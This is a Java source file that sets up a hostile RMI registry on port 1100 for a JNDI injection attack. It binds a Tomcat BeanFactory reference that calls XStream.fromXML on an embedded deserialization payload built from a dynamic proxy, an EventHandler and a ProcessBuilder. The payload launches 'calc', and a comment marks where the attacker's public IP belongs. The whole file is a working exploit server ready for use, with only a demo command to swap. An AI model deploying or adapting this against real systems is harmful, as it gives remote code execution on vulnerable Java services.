package org.example;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.NamingException;
import javax.naming.StringRefAddr;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class XstreamServer {
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException, AlreadyBoundException {
        Registry registry = LocateRegistry.createRegistry(1100);
        //攻击主机的公网ip
        System.setProperty("java.rmi.server.hostname", "127.0.0.1");

        ResourceRef ref = new ResourceRef("com.thoughtworks.xstream.XStream", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        String xml = "<sorted-set>\n"+
                "<dynamic-proxy>\n"+
                "<interface>java.lang.Comparable</interface>\n"+
                "<handler class='java.beans.EventHandler'>\n"+
                "<target class='java.lang.ProcessBuilder'>\n"+
                "<command>\n"+
                "<string>calc</string>\n"+
                "</command>\n"+
                "</target>\n"+
                "<action>start</action>\n"+
                "</handler>\n"+
                "</dynamic-proxy>\n"+
                "</sorted-set>\n";
        ref.add(new StringRefAddr("forceString", "a=fromXML"));
        ref.add(new StringRefAddr("a", xml));

        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.bind("FromXML", referenceWrapper);
        System.out.println("RMI Server start on 1100");
    }
}
